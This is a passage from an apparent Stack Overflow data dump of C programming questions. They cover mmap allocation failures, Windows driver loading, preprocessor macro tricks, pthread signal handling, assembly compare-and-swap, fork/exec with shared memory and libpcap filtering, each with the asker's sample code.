main(void)\n{ \n    uint64_t* rr_addr = 0;\n    uint64_t i = 17179869184;\n\n    printf(\"\\nsizeof(size_t): %llu\\n\", sizeof(size_t));\n\n    printf(\"(uint64_t)0x100000000: %llx\\n\", (uint64_t)0x100000000);\n    printf(\"1L &lt;&lt; 33: %llx\\n\", 1L &lt;&lt; 33);\n    rr_addr = mmap((void*)i, (1UL &lt;&lt; 33), PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);\n    printf(\"rr_addr: %p, %llu \\n\", rr_addr, rr_addr);\n    if (rr_addr == MAP_FAILED) {\n        perror(\"mmap error\");\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>On different systems (Linux, gcc), I get different results:</p>\n\n<p><strong>Result 1:</strong></p>\n\n<pre><code>sizeof(size_t): 8\n(uint64_t)0x100000000: 100000000\n1L &lt;&lt; 33: 200000000\nrr_addr: 0xffffffffffffffff, 18446744073709551615 \nmmap error: Cannot allocate memory\n</code></pre>\n\n<p>System info (Fedora 14):</p>\n\n<pre><code>Linux localhost.localdomain 2.6.35.10-74.fc14.x86_64 #1 SMP Thu Dec 23 16:04:50 UTC 2010 x86_64 x86_64 x86_64 GNU/Linux\n\ngcc (GCC) 4.5.1 20100924 (Red Hat 4.5.1-4)\n\nglibc: 2.12.90-21\n</code></pre>\n\n<p><strong>Result 2:</strong></p>\n\n<pre><code>sizeof(size_t): 8\n(uint64_t)0x100000000: 100000000\n1L &lt;&lt; 33: 200000000\nrr_addr: 0x400000000, 17179869184 \n</code></pre>\n\n<p>System info (Fedora 12):</p>\n\n<pre><code>Linux wiles 2.6.32.13 #2 SMP Fri Sep 10 01:29:43 HKT 2010 x86_64 x86_64 x86_64 GNU/Linux\n\ngcc (GCC) 4.4.4 20100630 (Red Hat 4.4.4-10)\n\nglibc verison: 2.11.2-1\n</code></pre>\n\n<p>I expect \"Result 2\". Maybe there is something wrong with my code.</p>\n\n<p>Please help me out.</p>\n\n<p><strong>Update 1</strong>: errno is printed out if mmap fails.</p>\n\n<p><strong>Update 3</strong>: after changing the mmap call to these lines:</p>\n\n<pre><code>char *cmd[20]; \n\nsprintf(cmd, \"pmap -x %i\", getpid()); \nprintf(\"%s\\n\", cmd);\nsystem(cmd);\n\nrr_addr = mmap((void*)i, (1UL &lt;&lt; 33), PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);\n\nprintf(\"%s\\n\", cmd);\nsystem(cmd);\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>sizeof(size_t): 8\n(uint64_t)0x100000000: 100000000\n1L &lt;&lt; 33: 200000000\npmap -x 5618\n5618:   ./test\nAddress           Kbytes     RSS   Dirty Mode   Mapping\n0000000000400000       4       4       0 r-x--  test\n0000000000600000       4       4       4 rw---  test\n00007f1cc941e000    1640     280       0 r-x--  libc-2.12.90.so\n00007f1cc95b8000    2044       0       0 -----  libc-2.12.90.so\n00007f1cc97b7000      16      16      16 r----  libc-2.12.90.so\n00007f1cc97bb000       4       4       4 rw---  libc-2.12.90.so\n00007f1cc97bc000      24      16      16 rw---    [ anon ]\n00007f1cc97c2000     132     108       0 r-x--  ld-2.12.90.so\n00007f1cc99c6000      12      12      12 rw---    [ anon ]\n00007f1cc99e0000       8       8       8 rw---    [ anon ]\n00007f1cc99e2000       4       4       4 r----  ld-2.12.90.so\n00007f1cc99e3000       4       4       4 rw---  ld-2.12.90.so\n00007f1cc99e4000       4       4       4 rw---    [ anon ]\n00007fffa0da8000     132       8       8 rw---    [ stack ]\n00007fffa0dff000       4       4       0 r-x--    [ anon ]\nffffffffff600000       4       0       0 r-x--    [ anon ]\n----------------  ------  ------  ------\ntotal kB            4040     476      80\npmap -x 5618\n5618:   ./test\nAddress           Kbytes     RSS   Dirty Mode   Mapping\n0000000000400000       4       4       0 r-x--  test\n0000000000600000       4       4       4 rw---  test\n00007f1cc941e000    1640     280       0 r-x--  libc-2.12.90.so\n00007f1cc95b8000    2044       0       0 -----  libc-2.12.90.so\n00007f1cc97b7000      16      16      16 r----  libc-2.12.90.so\n00007f1cc97bb000       4       4       4 rw---  libc-2.12.90.so\n00007f1cc97bc000      24      16      16 rw---    [ anon ]\n00007f1cc97c2000     132     108       0 r-x--  ld-2.12.90.so\n00007f1cc99c6000      12      12      12 rw---    [ anon ]\n00007f1cc99e0000       8       8       8 rw---    [ anon ]\n00007f1cc99e2000       4       4       4 r----  ld-2.12.90.so\n00007f1cc99e3000       4       4       4 rw---  ld-2.12.90.so\n00007f1cc99e4000       4       4       4 rw---    [ anon ]\n00007fffa0da8000     132       8       8 rw---    [ stack ]\n00007fffa0dff000       4       4       0 r-x--    [ anon ]\nffffffffff600000       4       0       0 r-x--    [ anon ]\n----------------  ------  ------  ------\ntotal kB            4040     476      80\nrr_addr: 0xffffffffffffffff, 18446744073709551615 \nmmap error: Cannot allocate memory\n</code></pre>\n\n<p><strong>Update 4</strong>: add \"system(\"ulimit -m -v\");\" just before calling mmap:\nThe output of ulimit is:</p>\n\n<pre><code>max memory size         (kbytes, -m) unlimited\nvirtual memory          (kbytes, -v) unlimited\n</code></pre>\n\n<p>The other output is the same as 'Update 3' (still fails) except the pid.</p>\n\n<p><strong>Update 5</strong>: the updated code which works on both systems:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;sys/mman.h&gt;\n\nint main(void)\n{ \n    uint64_t* rr_addr = 0;\n    uint64_t i = 17179869184;\n    uint64_t len = 0;\n\n    char cmd[20]; \n\n    printf(\"\\nsizeof(size_t): %llu\\n\", sizeof(size_t));\n\n    len = (1UL &lt;&lt; 32);\n    printf(\"len: %llx\\n\", len);\n\n    snprintf(cmd, sizeof cmd, \"pmap -x %i\", getpid()); \n    printf(\"%s\\n\", cmd);\n    system(cmd);\n\n    system(\"ulimit -m -v\");\n\n    rr_addr = mmap((void*)i, len, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0);\n\n    printf(\"%s\\n\", cmd);\n    system(cmd);\n\n    printf(\"rr_addr: %p, %llu \\n\", rr_addr, rr_addr);\n    if (rr_addr == MAP_FAILED) {\n        perror(\"mmap error\");\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>The right answer is given by @caf: adding the MAP_NORESERVE flag to mmap solves this problem. Details of the reason are in caf's answer. Thanks a lot caf and all these give kind help!</p>\n"},{"tags":["c","windows","winapi","ddk"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13254487,"title":"Why am I getting Error Code 6 on StartService?","body":"<p>For my purposes, I need to write a kernel mode driver for Windows. Currently I am attempting to make it work under Windows 7 x64.</p>\n\n<p>I created a simple project in Visual Studio 2012 with default code for a KMDF driver. I compiled the code with test-signing on. The driver was compiled and signed. \nI also have Test-Signing ON enabled as clearly displayed on the bottom left corner of my Desktop.</p>\n\n<p>Upon trying to start the driver as a service, I always get an Error Code 6: Invalid Handle error.(I have since simplified the code to just try and start it but still did not work;default code did not work either)</p>\n\n<p>Basically, I am having the same problem as the question asked here</p>\n\n<p><a href=\"http://stackoverflow.com/questions/12080157/startservice-error-6\">StartService Error 6</a> </p>\n\n<p>unfortunately he was never answered. I tried the provided solution, but it didn't help either.</p>\n\n<p>My code that tries to start the driver is </p>\n\n<pre><code>int _cdecl main(void)\n{\n    HANDLE hSCManager;\n    HANDLE hService;\n    SERVICE_STATUS ss;\n\n    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);\n\n    printf(\"Load Driver\\n\");\n\n    if(hSCManager)\n    {\n        printf(\"Create Service\\n\");\n\n        hService = CreateService(hSCManager, \"Example\", \n                             \"Example Driver\", \n                              SERVICE_ALL_ACCESS | SERVICE_START | DELETE | SERVICE_STOP , \n                              SERVICE_KERNEL_DRIVER,\n                              SERVICE_DEMAND_START, \n                              SERVICE_ERROR_IGNORE, \n                              \"\\\\path\\\\to\\\\driver\\\\KMDFDriver1.sys\", \n                              NULL, NULL, NULL, NULL, NULL);\n\n        if(!hService)\n        {\n            hService = OpenService(hSCManager, \"Example\", \n                   SERVICE_ALL_ACCESS | SERVICE_START | DELETE | SERVICE_STOP);\n\n            if(!hService)\n            {\n                // If initial startup of the driver failed, it will fail here.\n                process_error();\n                return 0;\n            }\n        }\n\n        if(hService)\n        {\n            printf(\"Start Service\\n\");\n\n            if(StartService(hService, 0, NULL) == 0)\n            {\n              // Start service ALWAYS returns 0. Only when executed for the first time. Next time it fails on OpenService.\n                process_error();\n                printf(\"Did not start!\\n\");\n            }\n            printf(\"Press Enter to close service\\r\\n\");\n            getchar();\n            ControlService(hService, SERVICE_CONTROL_STOP, &amp;ss);\n            DeleteService(hService);\n            CloseServiceHandle(hService);   \n        }\n\n        CloseServiceHandle(hSCManager);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>And this is the driver code</p>\n\n<pre><code>DRIVER_INITIALIZE DriverEntry;\n#ifdef ALLOC_PRAGMA\n#pragma alloc_text (INIT, DriverEntry)\n#endif\n\nNTSTATUS\nDriverEntry(\n    _In_ PDRIVER_OBJECT  DriverObject,\n    _In_ PUNICODE_STRING RegistryPath\n    )\n{\n\n    WDF_DRIVER_CONFIG config;\n    NTSTATUS status;\n\n    DbgPrint(\"Hello World!\\n\");\n    WDF_DRIVER_CONFIG_INIT(&amp;config,\n                       NULL\n                       );\n\n    config.DriverInitFlags = WdfDriverInitNonPnpDriver;\n\n    status = WdfDriverCreate(DriverObject,\n                         RegistryPath,\n                         WDF_NO_OBJECT_ATTRIBUTES,\n                         &amp;config,\n                         WDF_NO_HANDLE\n                         );\n\n    if (!NT_SUCCESS(status)) {\n        KdPrint( (\"WdfDriverCreate failed with \"\n              \"status 0x%x\\n\", status));\n    }\n\n    return status;\n}\n</code></pre>\n\n<p>The function <code>process_error()</code> is a wrapper around <code>GetLastError()</code> which in addition to providing the numeric value, displays a text version of the error code.\nI have exhausted all options provided to me to solve this issue. A google search revealed only one occurrence of this problem, and the question was asked here.</p>\n\n<p>What could the problem be?</p>\n\n<p>Extra notes: The driver was compiled with Visual Studio 2012 Ultimate, while my startup code was compiled with MinGW-W64(using GCC). But the startup code shouldn't matter as much as the driver.</p>\n\n<p>Extra notes 2: After wondering for a long time what could be wrong I started thinking if it's the test-sign certificate, because I tried driver source code provided from MSDN, and upon successful compilation, I still got ERROR_INVALID_HANDLE(Error Code 6) when trying to start it.\nI have still not found a solution.</p>\n"},{"tags":["c","boost","macros","preprocessor"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":2152,"score":4,"question_id":3420459,"title":"C Preprocessor, Macro \"Overloading\"","body":"<p>I'm trying to do some kind of Macro \"Overloading\", so that MACRO(something), gets expanded differently than MACRO(something, else).</p>\n\n<p>Using a snippet I got from <a href=\"http://stackoverflow.com/questions/2124339/c-preprocessor-va-args-number-of-arguments\">here</a> (I'm not sure if it's 100% portable) and some functions from the Boost PP Library, I was able to make it work :D</p>\n\n<pre><code>//THESE TWO COUNT THE NUMBER OF ARGUMENTS\n#define VA_NARGS_IMPL(_1, _2, _3, _4, _5, N, ...) N\n#define VA_NARGS(...) VA_NARGS_IMPL(__VA_ARGS__, 5, 4, 3, 2, 1)\n\n//THIS ONE RETURNS THE PARAMETER AT POSITION _i FROM A LIST OF __VA_ARGS__\n#define VA_ARG(_i, ...) BOOST_PP_ARRAY_ELEM(_i, (VA_NARGS(__VA_ARGS__), (__VA_ARGS__)))\n\n//AND THIS ONE IS THE 'OVERLOADED' MACRO ;)\n#define TEST(...) BOOST_PP_IF(BOOST_PP_EQUAL(1, VA_NARGS(__VA_ARGS__)), function_A(VA_ARG(0, __VA_ARGS__)), \\ //1 parameter\n                  BOOST_PP_IF(BOOST_PP_EQUAL(2, VA_NARGS(__VA_ARGS__)), function_B(VA_ARG(0, __VA_ARGS__) + VA_ARG(1, __VA_ARGS__)), \\ //2 parameters\n                  BOOST_PP_IF(BOOST_PP_EQUAL(3, VA_NARGS(__VA_ARGS__)), function_C(VA_ARG(1, __VA_ARGS__) + VA_ARG(2, __VA_ARGS__)), BOOST_PP_EMPTY())) // 3 parameters and so on ...\n\nSo       TEST(a) = function_A(a)\n      TEST(a, b) = function_B(a + b)\n   TEST(a, b, c) = function_C(b + c)\n</code></pre>\n\n<p>Now I'm still missing two other things that I want to do:</p>\n\n<ol>\n<li><p>(This one I don't really care if I never solve it) I believe that a MACRO can be written that when taking up the number of 'variants' and its correspondent 'output' generates a code similar like the one above. Something like TEMPLATE(3, function_A(...), function_B(...), function_C(...)) to generate the example above.</p></li>\n<li><p>What happens when TEST() is called without arguments? Well, VA_NARGS expands to 1. But the first argument is \"\"(nothing). I'm trying to find a way to either detect 'zero' arguments in <code>__VA_ARGS__</code> or to differentiate between a 'null' argument and a real one, in order to extend the 'overloading' function to react to this situation. Any ideas?</p></li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["c","file","gcc","makefile","multiple"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13268517,"title":"Cannot specify -c with multiple files","body":"<p>I've got this problem with my <code>makefile</code>:</p>\n\n<pre><code>gcc -c src/uno.c src/uno.h -o src/uno.o\ngcc: fatal error: cannot specify -o with -c, -S or -E with multiple files\n</code></pre>\n\n<p>How can i create a <code>.o</code> file with multiple files?</p>\n"},{"tags":["c++","c","process","mfc"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":4,"view_count":58,"score":-3,"question_id":13262403,"title":"Can I create process without use standard api function?","body":"<p>Is there any way to create process without using CreateProcess or ShellExecute , WinExec Api Function?</p>\n"},{"tags":["c","file","fseek"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1416,"score":5,"question_id":5957845,"title":"Using fseek and ftell to determine the size of a file has a vulnerability?","body":"<p>I've read posts that show how to use fseek and ftell to determine the size of a file. </p>\n\n<pre><code>FILE *fp;\nlong file_size;\nchar *buffer;\n\nfp = fopen(\"foo.bin\", \"r\");\nif (NULL == fp) {\n /* Handle Error */\n}\n\nif (fseek(fp, 0 , SEEK_END) != 0) {\n  /* Handle Error */\n}\n\nfile_size = ftell(fp);\nbuffer = (char*)malloc(file_size);\nif (NULL == buffer){\n  /* handle error */\n}\n</code></pre>\n\n<p>I was about to use this technique but then I ran into this <a href=\"https://www.securecoding.cert.org/confluence/display/seccode/FIO19-C.+Do+not+use+fseek%28%29+and+ftell%28%29+to+compute+the+size+of+a+file\">link</a> that describes a potential vulnerability. </p>\n\n<p>The link recommends using fstat instead. Can anyone comment on this?</p>\n"},{"tags":["c","matrix","csparse"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12352590,"title":"csparse error while solving sparse system of equations","body":"<p>I have a task in which I have to solve a system of linear equations Ax =B, where A is a sparse matrix of the order of 10000. I am using csparse to solve it. In my initial implementation, for demo purposes A is 3*3 order identity matrix and B ={1,2,3}. Below is the code snippet, which is returning 0 in the status which means there is some error in my implementation. What is that I am doing wrong ?</p>\n\n<pre><code>    cs A;\n    int  N = 3;\n    double b[]={1,2,3};\n    double data[]={1,1,1};\n    int columnIndices[]={0,1,2};\n    int rowIndices[]={0,1,2};\n    A.nzmax =3;\n    A.m = N;\n    A.n = N;\n    A.p = &amp;columnIndices[0];\n    A.i = &amp;rowIndices[0];\n    A.x = &amp;data[0];\n    A.nz = 3;\n    int status =  cs_cholsol(0,&amp;A,&amp;b[0]);\n    NSLog(@\"status=%d\",status);   // status always returns 0, which means error\n</code></pre>\n"},{"tags":["c","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":60,"score":0,"question_id":13269154,"title":"Pointer as declaration of a function?","body":"<p>First I have the declaration</p>\n\n<pre><code>char (*x)(int field);\nchar yes_or_no(int);\nchar yes_or_no(int field)\n{\n    if(field==1)\n    return 'y';\n    else\n    return 'n';\n}\n\nx=&amp;yes_or_no;\n\nprintf(\"Now we can call this function by using the pointer *x by using (*x)(1),\\nwhich gives us: \\n'%c'\\n\", (*x)(1));\n</code></pre>\n\n<p>This works properly, but now I have to do something with </p>\n\n<pre><code>char *y(int field);\n</code></pre>\n\n<p>Which is or could be a declaration of a function? How could I do 'something' with this last statement/declaration?</p>\n\n<p>Kind regards.</p>\n"},{"tags":["c","linux","kernel"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":183,"score":0,"question_id":13102540,"title":"How to suspend a task from within a kernel module (Linux)?","body":"<p>I have a Linux kernel module that runs every 10 seconds and scans whether there are any resource-hogging processes. I then need to suspend them for a minute (i.e. six loops through the code) and let them run again afterwards. I have already written the code to check for the condition, and have all the appropriate task_struct pointers.</p>\n\n<p>The question is, how do I suspend a task, given its task_struct pointer? And later on, how do I resume that task?</p>\n"},{"tags":["objective-c","c","enums","customization"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":59,"score":3,"question_id":13250491,"title":"Enum Customization: Is it possible to create subEnum?","body":"<p>So, this is code:</p>\n\n<pre><code>typedef enum{\n    zero, one, two, three, four, five, six, seven, eight, nine\n}Digits;\n\ntypedef enum{\n    zero, one, two, nine \n}DigitsThatILikeToUse;\n</code></pre>\n\n<p>Issue:\n    If i define function: </p>\n\n<pre><code>void takeMyFavoriteDigits(DigitsThatILikeToUse favorite); (C)\n\n-|+(void) takeMyFavoriteDigits:(DigitsThatILikeToUse)favorite; (Objective-C)\n</code></pre>\n\n<p>I can't use it with backreference to basic <code>enum Digits</code> because my order in <code>enum DigitsThatILikeToUse</code> is different.</p>\n\n<p>My solution is to write explicit position of numbers like this:</p>\n\n<pre><code>typedef enum{\n    zero = 0, one = 1, two = 2, nine = 9 \n}DigitsThatILikeToUseInEdition;\n</code></pre>\n\n<p>But! i can't iterate through this new <code>enum DigitsThatILikeToUseInEdition</code>.</p>\n\n<p>I want to create an <code>subEnum</code> in <code>enum</code> and iterate through it. is it possible?</p>\n\n<p>My best idea is to use something like this:</p>\n\n<pre><code>typedef enum{\n        beginIteratorDigitsThatILike, zero, one, two, nine, endIteratorDigitsThatILike, three, four, five, six, seven, eight\n    }Digits;\n</code></pre>\n\n<p>But maybe there any solutions?</p>\n"},{"tags":["c","unix","websphere-mq","aix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13234565,"title":"MQGET big message ( > 4MB) from the queue results in error 2010","body":"<p>I am trying to receive the message from the queue using ANSI-C and MQGET function. The problem is that I always get error 2010 (MQRC_DATA_LENGTH_ERROR).</p>\n\n<p>I found out that this error concerns parameter 7 of the MQGET call (DataLength). The message on my queue has 7157460 bytes. The channel I am using for MQGET has the \"Maximum message length\" set to 104857600 (as well as the queue holding the message).</p>\n\n<p>I am even using the MQGET from this example:\n<a href=\"http://www.capitalware.biz/dl/code/c/msg2file.zip\" rel=\"nofollow\">http://www.capitalware.biz/dl/code/c/msg2file.zip</a></p>\n\n<p>And I still end up with error 2010. What am I doing wrong? Should I somehow increase the maximum size of the message in MQSERVER environment variable?</p>\n\n<p>MQGET call:</p>\n\n<pre><code>/* ... */\nMQLONG   messlen;            /* message length received       */\n\nMQGET(Hcon,                  /* connection handle                 */\n        Hobj,                /* object handle                     */\n        &amp;md,                 /* message descriptor                */\n        &amp;gmo,                /* get message options               */\n        buflen,              /* pBuffer length                    */\n        pBuffer,             /* pointer to message buffer         */\n        &amp;messlen,            /* message length                    */\n        &amp;CompCode,           /* completion code                   */\n        &amp;Reason);            /* reason code                       */\n</code></pre>\n"},{"tags":["c","int"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":45,"score":1,"question_id":13268097,"title":"Leading Zeroes - Print digits of a number in words","body":"<p>I need a C program that will print the digits of an entered number using <code>switch</code> statements.</p>\n\n<p>For example:-  if I enter '001' as the value, it should print <code>zero zero one</code> as the output.</p>\n\n<p>I know how to print number to words of other numbers, ie, first reverse the number, then extract digit using modulus operator and then print the words using switch conditions.</p>\n\n<p>By default <code>C</code> takes the value <code>001</code> as <code>1</code> automatically. How can I stop that? I want to print the leading zeroes also.</p>\n"},{"tags":["c","pthreads","signals"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":552,"score":0,"question_id":5406649,"title":"Pthreads and signals","body":"<p>I'm having a little trouble with pthreads.  Basically, I want to catch a SIGINT and have all threads cleanup and exit.  What I have (skeleton code):</p>\n\n<p>main.c:</p>\n\n<pre><code>sig_atomic_t running;\n\nvoid handler(int signal_number)\n{\n    running = 0;\n}\n\nint main(void)\n{\n    queue job_queue = new_job_queue();\n\n    running = 1;\n\n    struct sigaction sa;\n    memset(&amp;sa, 0, sizeof(sa));\n    sa.sa_handler = &amp;handler;\n    sigaction(SIGINT, &amp;sa, NULL);\n\n    /* create a bunch of threads */\n    init_threads(&amp;job_queue);\n\n    while(running) {\n        /* do stuff */\n    }\n\n    cleanup();\n\n    return (0);\n}\n</code></pre>\n\n<p>threads.c</p>\n\n<pre><code>extern sig_atomic_t running;\npthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;\nsem_t queue_count;\n\nvoid init_threads(queue *q)\n{\n    int numthreads = 12; /* say */\n\n    sem_init (&amp;queue_count, 0, 0);\n\n    pthread_t worker_threads[numthreads];\n\n    int i;\n    for(i=0;i&lt;numthreads;i++)\n        pthread_create(&amp;worker_threads[i], NULL, &amp;thread_function, q);\n}\n\nvoid * thread_function(void *args)\n{\n    pthread_detatch(pthread_self());\n\n    queue *q = (queue *)args;\n\n    while(running) {\n\n        job *j = NULL;\n\n        sem_wait(&amp;queue_count);\n\n        pthread_mutex_lock(&amp;queue_mutex);\n        j = first_job_in_queue(q);\n        pthread_mutex_unlock(&amp;queue_mutex);\n\n        if(j) {\n            /*do something*/\n        }\n\n    }\n\n    return (NULL);\n}\n</code></pre>\n\n<p>I am having little luck with this.  Since you're not guarenteed which thread gets the signal I thought this was a good way to go.  But I am having a problem where <code>sem_wait()</code> in threads.c is hanging, which is expected but not desired.  The <code>while(running)</code> loop in threads.c seems redundant.  Should I maybe do a <code>pthread_kill()</code> to all the threads from main?  Any obvious problems with the above skeleton code?  Is there a better/easier way to go about doing this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","linux","windows","assembly","atomic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13267845,"title":"Atomic compare and swap in assembler OS independent","body":"<p>I am writing OS independent lockless queue, queue works fine (with default windows\\linux atomic CAS), but I want to make queue work without any change in linux and windows. So I gues I should write my own CAS in assembler, or there is other ways to achieveit ? </p>\n\n<p>So far I have this code:</p>\n\n<pre><code>global _CAS\n\n_CAS:\n\n    mov eax, [esp+4]    \n    mov edx, [esp+8]    \n    mov ecx, [esp+12]   \n\n    ;XCHG eax, edx  &lt;- this function works fine\n     CMPXCHG  ecx, eax, ebx \n\n    ret\n</code></pre>\n\n<p>I know that I still have to add <code>lock</code> before <code>CMPXCHG</code> and it should work with structures, but for now I'm more interested in making it working.</p>\n\n<p>I compile using nasm-2.10.05 with this command <code>nasm.exe -f elf -o cas.o  cas.asm</code>\nand I get this error <code>testas\\cas.asm:14: error: invalid combination of opcode and operands</code></p>\n"},{"tags":["objective-c","c","xcode4","nsmutablearray"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13267044,"title":"How to Convert NSMutableArray objects to const char in xcode","body":"<p>To develop a calculator in xcode I am using a c class for converting infix to postfix expression and its evaluation. But I have an NSString in my View controller class and I need to pass this NSString to a C class where the conversion and evaluation happens. How can I do this?</p>\n"},{"tags":["c","multithreading","exec","fork","shared"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13257983,"title":"How to deal with shared memory and shared semaphores on a fork-exec?","body":"<p>I'd like to add as new feature to a grown application to start execution of another application using fork (2) and exec (3) (currently execl).</p>\n\n<p>Unfortunately the application uses shared memory, shared semaphores and has a huge number of open file descriptors, which are all duplicated when calling fork. I know that I should close all file descriptors, shared resources etc. before calling execl in the child process, but parts of these are handled by third-party libraries and I have no means of accessing them.</p>\n\n<p>To top it all the application is threaded (using posix threads), but that should be ok as long as there are no asynchronous system calls between fork and exec in the child process (according to <a href=\"http://www.linuxprogrammingblog.com/threads-and-fork-think-twice-before-using-them\" rel=\"nofollow\">http://www.linuxprogrammingblog.com/threads-and-fork-think-twice-before-using-them</a>).</p>\n\n<p>The problem I'm facing now is that the execl call seems to somehow corrupt the shared resources, leading to a deadlock in the thread that uses them. This seems only to happen when calling execl as exiting the child process immediatly after fork with _exit (2) does not produce this behaviour.</p>\n\n<p>What is the proper way to deal with shared memory and shared semaphores when spawning a new process with fork and exec?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":13266138,"title":"C program to read a file and print just the numbers","body":"<p>I have a file containing strings as well as numbers. Eg. my file Store-1.txt contains \"coffee 2mug -4\".\nI need a c program to store the numbers only (i.e 2 and -4) by reading a file and saving just the numbers into an array.</p>\n\n<p>i am not able to figure out how exactly to do this. Any suggestions please.</p>\n\n<p>code is</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n\nint main(void)\n {\n char c,ch;\n int flag=0;\n  FILE *fptr=fopen(\"Store-1.txt\",\"r\");\n  if(fptr)\n {\n while((c=fgetc(fptr))!=EOF)\n {\n if(c=='-' || c== '+')\n     {\n      ch=c;\n      flag=1;\n     }\n if(c&gt;='0' &amp;&amp; c&lt;='9')\n  {\n    if(flag == 1)\n     { \n       printf(\"%c\",ch); flag =0;\n      }\n   printf(\"%c\",c);\n  }\n   }\n   }\n  else\nprintf(\"Error : file not found\");\n\n  system(\"pause\");\n }\n</code></pre>\n"},{"tags":["c++","c","compiler","portability","pragma"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":108,"score":3,"question_id":13267648,"title":"How portable is code with #pragma optimize?","body":"<p>How portable is code that uses <a href=\"http://msdn.microsoft.com/en-us/library/chh3fb0k.aspx\" rel=\"nofollow\"><code>#pragma optimize</code></a>? Do most compilers support it and how complete is the support for this <code>#pragma</code>?</p>\n"},{"tags":["c","pointers","segmentation-fault","strcpy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13228395,"title":"Segmentation fault in string copying","body":"<p>I'm getting the segmentation fault error for the inner while loop.</p>\n\n<pre><code>char **c;\nc=(char **)malloc(3*(N-1)*sizeof(char *));\n\nfor(int i=0;i&lt;3*(N-1);)\n{\n    char *temp;\n    gets(temp);\n    while(*temp!='$')\n    {\n        j=0;\n        while(*temp!=' ')\n        {\n            *(c[i]+j)=*(temp+j);\n            j++;\n        }\n        i++;\n    }\n    i++;\n}        \n</code></pre>\n\n<p>sorry for improper indentation.I know that manipulating char * strings would cause an error.But I am not sure about this error.I was tring to break tmp string into three different strings.</p>\n"},{"tags":["c","string","pointers","scanf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":13261169,"title":"Scanning in a string using pointers in C","body":"<p>Is the following considered good code?  Shouldn't I have used malloc somewhere?  I was able to compile this and it worked, but I feel like it shouldn't have.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void) {\n\n    char *name;\n\n    printf(\"Whats your name? \");\n    scanf(\"%s\", &amp;name);\n    printf(\"\\nyour name is %s\", &amp;name);\n\n    return 0;\n}\n</code></pre>\n\n<p>What happens if I want to modify name?  How would I go about doing so?</p>\n\n<p>Edit:  I am really just looking for the most efficient and correct way to do this using pointers.  I am assuming malloc is necessary.  </p>\n"},{"tags":["c","pointer-arithmetic"],"answer_count":6,"favorite_count":4,"up_vote_count":10,"down_vote_count":1,"view_count":2116,"score":9,"question_id":2117486,"title":"C pointer arithmetic","body":"<p>Given this code:</p>\n\n<pre><code>int *p, *q;\n\np = (int *) 1000;\nq = (int *) 2000;\n</code></pre>\n\n<p>What is <code>q - p</code> and how?</p>\n"},{"tags":["c","filter","pcap","libpcap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13267248,"title":"Will pcap_set_filter() work with pcap_open_offline()?","body":"<p>I'm have written a <code>pcap</code> program that uses <code>pcap_open_live()</code> and progressively applies a filter (ie. recompiles the <code>pcap</code> filter and sets the filter again after an initial pcap_loop), and I would like to test it on some <code>pcap</code> files I have saved from <code>Wireshark</code>.</p>\n\n<p>However, when I run the program, I can't even print out my packets unless I supply an empty filter to the <code>pcap_compile_filter</code>;</p>\n\n<p>Is this just a feature of using <code>lpcap</code> on a saved file, or am I doing something wrong?</p>\n\n<p>Here's a snippet of the code for perusal:</p>\n\n<pre><code>int main(int argc, char **argv)\n{\nchar *dev = NULL;           /* capture device name */\nchar errbuf[PCAP_ERRBUF_SIZE];      /* error buffer */\npcap_t *handle;             /* packet capture handle */\nchar filter_exp[] = \"ip\";           /* filter expression [3] */\nstruct bpf_program fp;          /* compiled filter program (expression) */\nbpf_u_int32 mask;           /* subnet mask */\nbpf_u_int32 net;            /* ip */\nint num_packets = -1;           /* number of packets to capture  -1 =&gt; capture forever! */\n\nprintf(\"Filter expression: %s\\n\", filter_exp);\n\n// open capture device\nhandle = pcap_open_offline(\"heartbeats2\", errbuf);\nif (handle == NULL) {\n    fprintf(stderr, \"pcap_open_offline failed: %s\\n\", 